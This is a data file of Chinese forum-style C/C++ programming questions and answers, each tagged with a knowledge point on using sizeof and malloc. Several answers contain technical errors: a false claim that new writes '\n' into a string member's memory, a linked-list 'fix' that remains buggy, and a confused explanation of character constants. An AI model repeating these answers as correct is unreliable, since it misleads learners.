{"Answer": "&lt;p&gt;理论上来讲&amp;#xff0c;只有第二句进行指针赋值的话&amp;#xff0c;是不会有问题的&amp;#xff0c;毕竟等号左右都只是一个指针。&lt;/p&gt;\n\n&lt;p&gt;但是如果后续用类的指针进行赋值等操作时&amp;#xff0c;就有可能出现问题。例如&amp;#xff0c;若DuLNode 类中有string类型的成员变量s&amp;#xff0c;在用new申请内存时&amp;#xff0c;new会调用构造函数对变量s进行必要的初始化&amp;#xff0c;会将为s分配的最后一个字节的内存设置为&amp;#39;\\n&amp;#39;&amp;#xff0c;使得变量s可以正常进行赋值和读取。但是&amp;#xff0c;如果是用malloc申请的内存&amp;#xff0c;返回的是一个void*的原始内存块&amp;#xff0c;内部没有做任何初始化&amp;#xff0c;即使强制转换为(DuLNode*)&amp;#xff0c;其本质还是原始内存块&amp;#xff0c;在对变量s进行操作时&amp;#xff0c;就会报错。&lt;/p&gt;\n\n&lt;p&gt;此外&amp;#xff0c;用malloc申请内存时&amp;#xff0c;需要指定内存大小&amp;#xff0c;申请后得到的就是一个固定大小的内存。而用new申请的std::string类型的内存&amp;#xff0c;程序会根据需要进行重新申请和分配内存。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++中new可以实现的换用为什么malloc会报错", ["\n", "DuLNode *p = new DuLNode;//使用这句可以正确执行，而使用下面的语句无法执行\n//DuLNode *p = (DuLNode *)malloc(sizeof(DuLNode));", "\n\n", "使用第一句可以顺利执行，下面一句会报错，除这两句之外无任何差别"]], "Tag": "程序设计"}
{"Answer": "```\r\n// Q1054302.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include&lt;stdio.h&gt;\r\n#include&lt;stdlib.h&gt;\r\ntypedef struct treeNode//定义\r\n{\r\n    int data;\r\n    treeNode *left;\r\n    treeNode *right;\r\n} treenode, *TreeNode;\r\nvoid pre(TreeNode node)//前序遍历\r\n{\r\n\r\n    if(node==NULL)\r\n        return ;\r\n    printf(\"%d \", node-&gt;data);\r\n    pre(node-&gt;left);\r\n    pre(node-&gt;right);\r\n}\r\nvoid mid(TreeNode node)//中序遍历\r\n{\r\n\r\n    if(node==NULL)\r\n        return ;\r\n    mid(node-&gt;left);\r\n    printf(\"%d \", node-&gt;data);\r\n    mid(node-&gt;right);\r\n}\r\nvoid beh(TreeNode node)//后序遍历\r\n{\r\n\r\n    if(node==NULL)\r\n        return ;\r\n    beh(node-&gt;left);\r\n    beh(node-&gt;right);\r\n    printf(\"%d \", node-&gt;data);\r\n}\r\nvoid tree(TreeNode one)//定义一个现成的二叉树\r\n{\r\n\tone-&gt;data=3;\r\n\tone-&gt;left=(treenode*)malloc(sizeof(treenode));\r\n\t\tone-&gt;left-&gt;data=9;\r\n\t\tone-&gt;left-&gt;left=NULL;\r\n\t\tone-&gt;left-&gt;right=NULL;\r\n\tone-&gt;right=(treenode*)malloc(sizeof(treenode));\r\n\t\tone-&gt;right-&gt;data=20;\r\n\t\tone-&gt;right-&gt;left=(treenode*)malloc(sizeof(treenode));\r\n\t\t\tone-&gt;right-&gt;left-&gt;data=15;\r\n\t\t\tone-&gt;right-&gt;left-&gt;left=NULL;\r\n\t\t\tone-&gt;right-&gt;left-&gt;right=NULL;\r\n\t\tone-&gt;right-&gt;right=(treenode*)malloc(sizeof(treenode));\r\n\t\t\tone-&gt;right-&gt;right-&gt;data=7;\r\n\t\t\tone-&gt;right-&gt;right-&gt;left=NULL;\r\n\t\t\tone-&gt;right-&gt;right-&gt;right=NULL;\r\n}\r\nint main()//主方法\r\n{\r\n    TreeNode  one;\r\n\tone=(treenode*)malloc(sizeof(treenode));\r\n    tree(one);\r\n    printf(\"该二叉树的前序遍历为:\\n\");\r\n    pre(one);\r\n    printf(\"\\n该二叉树的中序遍历为:\\n\");\r\n    mid(one);\r\n    printf(\"\\n该二叉树的后序遍历为:\\n\");\r\n    beh(one);\r\n}\r\n\r\n```\r\n该二叉树的前序遍历为:\r\n3 9 20 15 7\r\n该二叉树的中序遍历为:\r\n9 3 15 20 7\r\n该二叉树的后序遍历为:\r\n9 15 7 20 3 Press any key to continue . . .", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["【c语言数据结构】遍历二叉树", ["代码一运行就停止工作，求助大神，看看我的问题是什么", "\n\n", "#include<stdio.h>\n#include<stdlib.h>\ntypedef struct treeNode//定义\n{\n    int data;\n    struct treeNode *left;\n    struct treeNode *right;\n}treenode,*TreeNode;\nvoid pre(TreeNode node)//前序遍历\n{\n\n    if(node==NULL)\n        return ;\n    printf(\"%d \", node->data);\n    pre(node->left);\n    pre(node->right);\n}\nvoid mid(TreeNode node)//中序遍历\n{\n\n    if(node==NULL)\n        return ;\n    mid(node->left);\n    printf(\"%d \", node->data);\n    mid(node->right);\n}\nvoid beh(TreeNode node)//后序遍历\n{\n\n    if(node==NULL)\n        return ;\n    beh(node->left);\n    beh(node->right);\n    printf(\"%d \", node->data);\n}\nvoid tree(TreeNode one)//定义一个现成的二叉树\n{\n    one=(TreeNode*)malloc(sizeof(treenode));\n    one->left=(TreeNode*)malloc(sizeof(treenode));\n    one->right=(TreeNode*)malloc(sizeof(treenode));\n    one->right->left=(TreeNode*)malloc(sizeof(treenode));\n    one->right->right=(TreeNode*)malloc(sizeof(treenode));\n    one->left->left=(TreeNode*)malloc(sizeof(treenode));\n    one->left->right=(TreeNode*)malloc(sizeof(treenode));\n    one->right->left->left=(TreeNode*)malloc(sizeof(treenode));\n    one->right->left->right=(TreeNode*)malloc(sizeof(treenode));\n    one->right->right->left=(TreeNode*)malloc(sizeof(treenode));\n    one->right->right->right=(TreeNode*)malloc(sizeof(treenode));\n\n    one->data=3;\n    one->left->data=9;\n    one->right->data=20;\n    one->right->left->data=15;\n    one->right->right->data=7;\n}\nvoid main()//主方法\n{\n    TreeNode  one;\n    tree(one);\n    printf(\"该二叉树的前序遍历为:\\n\");\n    pre(one);\n    printf(\"该二叉树的中序遍历为:\\n\");\n    mid(one);\n    printf(\"该二叉树的后序遍历为:\\n\");\n    beh(one);\n}\n\n\n"]], "Tag": "程序设计"}
{"Answer": "malloc是分配一块内存并返回这块内存的起始地址，你把该地址赋值给了*L，而L的值是L1的地址，因此*L就是L1。所以\r\n*L=(Linklist)malloc(sizeof(Lnode));这条语句改变的就是L1啊。\r\nps：把指针理解成普通变量就容易理解了,指针只是一个保存地址的变量，可以解析而已。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于C中二级指针传参的问题", [" #include <stdio.h>\n#include <stdlib.h>\n#define m 3\n#define n 4\n\ntypedef struct Lnode\n{\n    int data;\n    struct Lnode *next;\n}Lnode,*Linklist;//节点类型和指向结构的指针类型\n\nvoid CreatlistF(Linklist *L);\n\nvoid main ()\n{\n    Linklist L1;\n//  Linklist p;//等价于Lnode *p;\n    //p=&L;\n    CreatlistF(&L1);\n    printf(\"\\n\");\n}\n\nvoid CreatlistF(Linklist *L)\n{\n    *L=(Linklist)malloc(sizeof(Lnode));\n    printf(\"\\n\");\n}\n\n", "\n\n", "代码如上，在调试过程中出现如下图结果：", "\n\n", "接下来分配一块内存，这一步会使指针L指向这块内存吧？", "\n\n", "这个过程表明，L1指向了这块分配好的内存地址", "\n\n", "我不是太明白：", "\n\n", "\n", "malloc不应该是返回一个指向这块内存地址的指针，假设这个指针是p，那么malloc那一句应该等价于*L=*p;", "\n", "所以说应该是让L指向这块内存，因而L存储的应该是分配的内存地址。", "\n", "怎么结果是使L1指向这个地址了。", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;ul&gt;&lt;li&gt;这篇博客也许可以解决你的问题&amp;#x1f449; &amp;#xff1a;&lt;a href=\"https://blog.csdn.net/weixin_44570549/article/details/99654347\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;font size=\"3\"&gt;ListBox控件&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于listbox 排序问题", ["一个线程 收", "\n", "DWORD WINAPI ", "ThreadInProc(LPVOID ", "lpv", ")", " {\n    ", "while", " (iThread)\n    {\n        ", "if", " (", "0", " < recv(sClient, Sin, sizeof(Sin), ", "0", ")) {\n            sprintf", "_s(SinEx, ", "sizeof", "(SinEx)", ", ", "\"Server : %s\"", ", Sin);\n            ", "SendMessage(GetDlgItem(", "hClientDialog", ", IDC_LISTIN)", ", LB_ADDSTRING, ", "0", ", (LPARAM)SinEx);\n        }\n    }\n    return ", "0", ";\n\n", "\n", "主线程 发", "\n", "            ", "GetDlgItemText(", "hClientDialog", ", IDC_EDITOUT, Sout, ", "sizeof", "(Sout)", ");\n            ", "if", " (send(sClient, Sout, sizeof(Sout),", "0", ")!= SOCKET_ERROR)\n            {\n                sprintf", "_s(SoutEx,", "sizeof", "(SoutEx)", ", ", "\"Client Me : %s\"", ", Sout);\n                ", "SendMessage(GetDlgItem(", "hClientDialog", ",IDC_LISTIN)", ", LB_ADDSTRING, ", "0", ",(LPARAM)SoutEx);\n                ", "SetDlgItemText(", "hClientDialog", ", IDC_EDITOUT, NULL)", ";\n            }\n\n\n", "\n", "为啥 客户端的消息 没有插到服务器发来第一句的下一行 ", "\n", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;ul&gt;&lt;li&gt;你可以看下这个问题的回答&lt;a href=\"https://ask.csdn.net/questions/7550888\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;font size=\"3\"&gt;https://ask.csdn.net/questions/7550888&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["数组传参 时用一级指针和二级指针传参时为什么一个加&一个不加", ["void", " ", "test", " (", "int", "  *p,", "int", " sz", ")", "\n {  ", "int", " i=", "0", ";\n  ", "for", "(i=", "0", ";i<sz;i++)\n   printf(", "\"%d\"", ",(*((*p)+i)));\n\n }\n", "int", " ", "main", " (", ")", "\n{\n  ", "int", " arr1={", "1", ",", "2", ",", "3", ",", "4", ",", "5", "};\n  ", "int", " *p=arr1;\n ", "int", " sz=", "sizeof", "(arr1)/", "sizeof", "(arr1[", "0", "]);\n  test (&p,sz);\n", "return", " ", "0", ";\n}\n", "\n", "#include<stdio.h>", "void test (int*p,int sz)", " {  int i=0;", "  for(i=0;i<sz;i++)", "   printf(\"%d\",((*p)+i));", "\n", " }", "int main ()", "{", "  int arr1[]={1,2,3,4,5};", "  int *p=arr1;", " int sz=sizeof(arr1)/sizeof(arr1[0]);", "  test (p,sz);", "return 0;", "}", "\n", "\n\n"]], "Tag": "程序设计"}
{"Answer": "因为你写入的时候使用sizeof ,sizeof 对应的字符串数组，如果没有指定大小，最后要把\\0 算进去，所以最后的空格是\\0\\0;\r\n下面修改一下就OK了。\r\n\r\n```\r\n\t\t::WriteFile(hFile, &amp;wUnicode, sizeof(wUnicode), &amp;dwSize, NULL);\r\n\t\t::WriteFile(hFile, wchMPtitle, wcslen(wchMPtitle)*2, &amp;dwSize, NULL);\r\n\t\t::WriteFile(hFile, wchMPdefault, wcslen(wchMPdefault)*2, &amp;dwSize, NULL);\r\n\t\t::WriteFile(hFile, wchMPdefaulttitle, wcslen(wchMPdefaulttitle)*2, &amp;dwSize, NULL);\r\n\t\t::WriteFile(hFile, wchMPidynccount, wcslen(wchMPidynccount)*2, &amp;dwSize, NULL);\r\n\t\t::WriteFile(hFile, wchMPsubmemheadsize, wcslen(wchMPsubmemheadsize)*2, &amp;dwSize, NULL);\r\n \r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["跪求大神 Win32文件操作", ["使用Unicode字符集", "\n当WriteFile键入\\r\\n的时候，会有多余的一个空格出来", "\n这个空格应该是一个-t的制表符", "\n我自定义了一个文件格式ded，但是用txt打开", "\n\n", "代码：", "\n\n", "HANDLE hFile = ::CreateFile(wchFilePath, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);", "\n\n", "DWORD dwSize = 0;", "\nWORD wUnicode = 0xfeff;", "\nwchar_t wchMPtitle[] = _T(\"[MemoryPool]\\r\\n\");", "\nwchar_t wchMPdefault[] = _T(\"MemoryPool=MemoryConfigDefault\\r\\n\");", "\nwchar_t wchMPdefaulttitle[] = _T(\"[MemoryConfigDefault]\\r\\n\");", "\nwchar_t wchMPidynccount[] = _T(\"iDyncCount=10\\r\\n\");", "\nwchar_t wchMPsubmemheadsize[] = _T(\"iSubMemHeadSize=128\");", "\n\n", "::WriteFile(hFile, &wUnicode, sizeof(wUnicode), &dwSize, NULL);", "\n::WriteFile(hFile, wchMPtitle, sizeof(wchMPtitle), &dwSize, NULL);", "\n::WriteFile(hFile, wchMPdefault, sizeof(wchMPdefault), &dwSize, NULL);", "\n::WriteFile(hFile, wchMPdefaulttitle, sizeof(wchMPdefaulttitle), &dwSize, NULL);", "\n::WriteFile(hFile, wchMPidynccount, sizeof(wchMPidynccount), &dwSize, NULL);", "\n::WriteFile(hFile, wchMPsubmemheadsize, sizeof(wchMPsubmemheadsize), &dwSize, NULL);", "\n\n", "输出结果：", "\n[MemoryPool]", "\n    MemoryPool=MemoryConfigDefault", "\n    [MemoryConfigDefault]", "\n    iDyncCount=10", "\n    iSubMemHeadSize=128", "\n\n", "问题是如何才能去掉那个制表符呢？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你这telNum,telId,send_data变量从哪来的啊&amp;#xff1f;&amp;#xff1f;&amp;#xff1f;你只有str1,str2,str3啊&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["别人字符串相加的程序我无法运行", ["别人字符串相加的程序我无法运行", "#include <string.h>", "\n", "int main(void)", "{", "    char* str1 = \"Hello\";    //(1)", "    char* str2 = \"my\";", "    char* str3 = \"program1\";", "    char* temp;        //用于储存最终生成的字符串", "\n", "temp = (", "char", "*)", "malloc", "(", "sizeof", "(", "char", ") * ", "50", ");    ", "//申请内存空间，此处申请大小为50个字符（char）的大小 (2)", "\n", "strcpy", "(temp, telNum);        ", "//(3)", "\n\n", "strcat", "(temp, telId);\n", "strcat", "(temp, send_data);\n\n", "printf", "(temp);\n\n", "free", "(temp);        ", "//(4）释放内存", "\n\n", "return", " ", "0", ";\n", "\n", "}", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;修改如下&amp;#xff0c;供参考&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;malloc.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;assert.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; N 5     &lt;span class=\"hljs-comment\"&gt;//人数&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; M 3     &lt;span class=\"hljs-comment\"&gt;//课程数&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;Student&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;  num;\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; name[&lt;span class=\"hljs-number\"&gt;20&lt;/span&gt;];\n    &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; score[M];\n};\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;Input&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(Student* Stu, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; len)&lt;/span&gt; &lt;span class=\"hljs-comment\"&gt;//Student* Input(Student* Stu, int len)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i,j;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;请输入学生信息&amp;#xff0c;编号 姓名  %d门课程成绩\\n&amp;#34;&lt;/span&gt;,M);&lt;span class=\"hljs-comment\"&gt;//课程1成绩&amp;#xff0c;课程2成绩&amp;#xff0c;课程3成绩\\n&amp;#34;);&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; len; i&amp;#43;&amp;#43;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d %s&amp;#34;&lt;/span&gt;, &amp;amp;Stu[i].num, Stu[i].name);\n        &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; M; j&amp;#43;&amp;#43;)\n        {\n             &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%lf&amp;#34;&lt;/span&gt;, &amp;amp;Stu[i].score[j]);\n        }\n    }\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;Print&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(Student* Stu, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; len)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;    i,j,count&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; tmp &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; max &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; tmp1 &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; tmp2 &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; tmp3 &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; len; i&amp;#43;&amp;#43;)\n    {\n        tmp1 &amp;#43;&amp;#61; Stu[i].score[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;];\n        tmp2 &amp;#43;&amp;#61; Stu[i].score[&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;];\n        tmp3 &amp;#43;&amp;#61; Stu[i].score[&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;];\n        &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; M; j&amp;#43;&amp;#43;)\n        {\n            tmp &amp;#43;&amp;#61; Stu[i].score[j];\n        }\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (max &amp;lt; tmp)\n        {\n            max &amp;#61; tmp;\n            count &amp;#61; i;\n        }\n        tmp &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    }\n    tmp1 &amp;#61; tmp1 / len;\n    tmp2 &amp;#61; tmp2 / len;\n    tmp3 &amp;#61; tmp3 / len;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;课程1平均成绩:%.2f 课程2平均成绩: %.2f 课程3平均成绩: %.2f\\n&amp;#34;&lt;/span&gt;, tmp1, tmp2, tmp3);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;最高分学生数据为: %d %s &amp;#34;&lt;/span&gt;, Stu[count].num, Stu[count].name);\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; M; i&amp;#43;&amp;#43;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%.2f &amp;#34;&lt;/span&gt;, Stu[count].score[i]);\n    }\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%.2f\\n&amp;#34;&lt;/span&gt;, max/M);\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    Student Stu1[N] &amp;#61; { &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; };\n    &lt;span class=\"hljs-comment\"&gt;//Input(Stu1, (sizeof(Stu1) / sizeof(Stu1[0])));&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;Input&lt;/span&gt;(Stu1, N);\n    &lt;span class=\"hljs-comment\"&gt;//Print(Stu1, (sizeof(Stu1) / sizeof(Stu1[0])));&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;Print&lt;/span&gt;(Stu1, N);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n \n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这段代码哪里错了啊？", ["#include<stdio.h>", "#include<malloc.h>", "#include<assert.h>", " #define N 5", "struct Student", "{", "    int num;", "    char name[20];", "    double score[3];", "};", "\n", "Student* Input(Student* Stu, int len)", "{", "    assert(Stu != NULL);", "    printf(\"请输入学生信息，编号 姓名 课程1成绩，课程2成绩，课程3成绩\\n\");", "    for (int i = 0; i < len; i++)", "    {", "        scanf_s(\"%d %s\", &Stu[i].num, &Stu[i].name, 20);", "        for (int j = 0; j < 3; j++)", "        {", "            scanf_s(\"%lf\", &Stu[i].score[j]);", "        }", "\n", "}\n", "return", " Stu;\n", "\n", "}", "void Print(Student* Stu, int len)", "{", "    int count = 0;", "    double tmp = 0;", "    double max = 0;", "    double tmp1 = 0;", "    double tmp2 = 0;", "    double tmp3 = 0;", "    double* arr = (double*)malloc(sizeof(double) * len);", "    double* brr = (double*)malloc(sizeof(double) * len);", "    double* crr = (double*)malloc(sizeof(double) * len);", "    double* drr = (double*)malloc(sizeof(double) * len);", "    for (int i = 0; i < len; i++)", "    {", "        tmp1 += Stu[i].score[0];", "        tmp2 += Stu[i].score[1];", "        tmp3 += Stu[i].score[2];", "        for (int j = 0; j < 3; j++)", "        {", "            tmp += Stu[i].score[j];", "        }", "        arr[i] = tmp;", "        tmp = 0;", "    }", "    for (int i = 0; i < len; i++)", "    {", "        if (max < arr[i])", "        {", "            max = arr[i];", "            count = i;", "        }", "    }", "    tmp1 = tmp1 / len;", "    tmp2 = tmp2 / len;", "    tmp3 = tmp3 / len;", "    printf(\"课程1平均成绩:%f 课程2平均成绩: %f 课程3平均成绩: %f\\n\", tmp1, tmp2, tmp3);", "    printf(\"最高分学生数据为: %d %s \", Stu[count].num, Stu[count].name);", "    for (int i = 0; i < 3; i++)", "    {", "        printf(\"%f \", Stu[count].score[i]);", "    }", "    printf(\"%f\\n\", max/3);", "\n", " //释放动态内存", "    free(arr);", "    free(brr);", "    free(crr);", "    free(drr);", "}", "int main()", "{", "\n", "Student Stu1[N] = { ", "0", " };\nInput(Stu1, (", "sizeof", "(Stu1) / ", "sizeof", "(Stu1[", "0", "])));\nPrint(Stu1, (", "sizeof", "(Stu1) / ", "sizeof", "(Stu1[", "0", "])));\n\n\n", "return", " ", "0", ";\n", "\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你每次write都用的color数组名&amp;#xff0c;相当于数组的第一个元素&amp;#xff0c;sizeof(int)就是写入4个字节&amp;#xff0c;第一个元素是红色&amp;#xff0c;所以实际写入的都是红色&lt;br /&gt;wirte(fb_0,color[i][j],sizeof(int));试试&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["我用C语言编写一个程序在GEC6818显示三色旗，为什么只显示一个颜色呢？", ["#C语言编写一个程序在GEC6818显示竖向三色旗，但是为什么只显示一种颜色（红色）", "\n", "代码：", "\n", "int main()", "{", "    int fb_0;", "    int color[480][800];", "    int i,j;", "\n", "fb_", "0", "=", "open", "(", "\"/dev/fb0\"", ",O_RDWR);\n", "if", "(fb_", "0", "<", "0", ")\n{\n    perror(", "\"err!!!\"", ");\n    ", "return", " ", "0", ";\n}\n", "printf", "(", "\"xianshi:%d\\n\"", ",fb_", "0", ");\n", "for", "(i=", "0", ";i<", "480", ";i++)\n{\n    ", "for", "(j=", "0", ";j<", "266", ";j++)\n    {\n        color[i][j]=", "0x00ff0000", ";\n        ", "write", "(fb_", "0", ",color,sizeof(", "int", "));\n        ", "printf", "(", "\"1\"", ");\n    }\n    ", "for", "(j=", "266", ";j<", "532", ";j++)\n    {\n        color[i][j]=", "0x0000ff00", ";\n        ", "write", "(fb_", "0", ",color,sizeof(", "int", "));\n        ", "printf", "(", "\"2\"", ");\n    }\n    ", "for", "(j=", "532", ";j<", "800", ";j++)\n    {\n        color[i][j]=", "0x000000ff", ";\n        ", "write", "(fb_", "0", ",color,sizeof(", "int", "));\n        ", "printf", "(", "\"3\"", ");\n    }\n}\n", "close", "(fb_", "0", ");\n", "return", " ", "0", ";\n", "\n", "}", "运行结果：", "\n", "\n", "求解答,万分感谢。"]], "Tag": "程序设计"}
{"Answer": "```\r\n LinkList ListInsert(LinkList L1)\r\n{\r\n      int m;\r\n      LinkList s,p,L;\r\n      p=L=CreateListR(L1);\r\n      scanf(\"%d\",&amp;m);\r\n      while(p!=NULL)\r\n      {\r\n            if(p-&gt;data&gt;m)\r\n            {\r\n                  s=(LinkList)malloc(sizeof(Lnode));\r\n                  s-&gt;data=m;\r\n                  s-&gt;next=L-&gt;next;\r\n\t\t\t} //是后括号\r\n            p=p-&gt;next; //哪里来的q，是p吧。\r\n            printf(\"%d \",p-&gt;data);\r\n\r\n      }\r\n      return 0;\r\n}\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["顺序链表的插入用C语言编程实现", ["将一个整数插入到有序的顺序链表中，以下是我的源程序，请问哪错了啊？？", "\n#include ", "\n#include ", "\n\n", "typedef struct Lnode", "\n{", "\n      int data;", "\n      struct Lnode *next;", "\n}Lnode,*LinkList;", "\n\n", "LinkList CreateListR(LinkList L)", "\n{", "\n      int n;", "\n      LinkList p,s;", "\n      p=L=(LinkList)malloc(sizeof(Lnode));", "\n      scanf(\"%d\",&n);", "\n      for(;n>0;n--)", "\n      {", "\n            s=(LinkList)malloc(sizeof(Lnode));", "\n            scanf(\"%d\",s->data);", "\n            p->next=s;      p=s;", "\n      }", "\n      p->next=NULL;", "\n      return L;", "\n}", "\n\n", "LinkList ListInsert(LinkList L1)", "\n{", "\n      int m;", "\n      LinkList s,p,L;", "\n      p=L=CreateListR(L1);", "\n      scanf(\"%d\",&m);", "\n      while(p!=NULL)", "\n      {", "\n            if(p->data>m)", "\n            {", "\n                  s=(LinkList)malloc(sizeof(Lnode));", "\n                  s->data=m;", "\n                  s->next=L->next;     {", "\n            q=q->next;", "\n            printf(\"%d \",q->data);", "\n\n", "  }\n  return 0;\n", "\n\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;在C标准中:&lt;br /&gt;char 和 字符变量属于字符常量&amp;#xff0c;大小当然是1。&lt;br /&gt;‘a’被称作整形字符常量&amp;#xff08;integer character constant&amp;#xff09;&amp;#xff0c;相当于是int类型&amp;#xff0c;故为4。&lt;/p&gt;\n&lt;p&gt;c语言中字符常量是指由一对单引号括起来的单个字符&amp;#xff0c;如“ &amp;#39;a&amp;#39;”、“&amp;#39;D&amp;#39;”、“&amp;#39;&amp;#xff1f;&amp;#39;”、“&amp;#39;$&amp;#39;”&amp;#xff1b;它代表ASCII字符集中的一个字符&amp;#xff0c;在内存中占4个字节&amp;#xff0c;存放的是字符的ASCII码&amp;#xff08;整型数据&amp;#xff09;。C语言规定所有字符常量都作为整型量来处理。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c字符存储大小问题：", ["    char ch = ", "'a'", ";\n    ", "printf", "(", "\"%d\\n\"", ", sizeof(ch));\n    ", "printf", "(", "\"%d\\n\"", ", sizeof(", "'a'", "));\n", "\n", "输出结果是：", "\n", "两个的区别是什么？"]], "Tag": "程序设计"}
